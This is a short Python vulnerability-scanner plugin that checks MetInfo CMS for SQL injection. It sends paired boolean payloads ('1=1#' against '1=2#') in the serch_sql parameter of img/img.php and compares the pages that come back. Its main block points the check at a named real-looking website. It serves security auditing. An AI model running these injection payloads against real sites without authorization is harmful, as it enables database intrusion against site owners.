#!/usr/bin/python
#-*- encoding:utf-8 -*-
#__author__ = 'Stefanie'


def assign(service, arg):
    if service == "metinfo":
        return True, arg


def audit(arg):
    payload1 = 'img/img.php?class1=1&serch_sql=%201%3D1%23'
    payload2 = 'img/img.php?class1=1&serch_sql=%201%3D2%23'
    url1 = arg + payload1
    url2 = arg + payload2
    test = "<option selected='selected'"
    code, head,res1, errcode, _ = curl.curl(url1)
    code1, head,res2, errcode, _ = curl.curl(url2)

    if code == 200 and code1 == 200 and test not in res2 and test in res1:
        security_hole(url1)
                        
if __name__ == '__main__':
    from dummy import *
    audit(assign('metinfo', 'http://www.jinwn.com/')[1])